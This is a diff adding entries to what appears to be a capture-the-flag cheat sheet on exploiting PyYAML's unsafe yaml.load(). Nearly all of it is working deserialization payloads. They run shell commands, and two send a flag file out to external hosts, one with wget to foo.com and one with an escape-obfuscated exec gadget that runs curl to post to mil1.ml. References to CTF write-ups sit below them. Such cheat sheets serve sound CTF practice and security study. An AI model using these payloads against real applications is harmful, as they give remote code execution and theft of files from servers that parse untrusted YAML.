@@ -199,4 +199,19 @@ Morse
 # yaml
 
 - PyYAML yaml.load()
-    - `!!python/object/apply:os.system ["cat flag.txt"]`
+    ```yaml
+    some_option: !!python/object/apply:os.system ["cat flag.txt"]`
+    # ||
+    some_option: !!python/object/apply:subprocess.call
+      args: [wget foo.com/"$(cat flag)"]
+      kwds: {shell: true}
+    ```
+        - https://imcmy.me/hitcon-ctf-2016-writeup-archive/
+    ```yaml
+    !!python/object/new:type
+      args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
+      listitems: "\x5f\x5fimport\x5f\x5f('os')\x2esystem('curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt')"
+    ```
+        - https://hackmd.io/@harrier/uiuctf20
+        - https://github.com/yaml/pyyaml/pull/386
+        - https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1
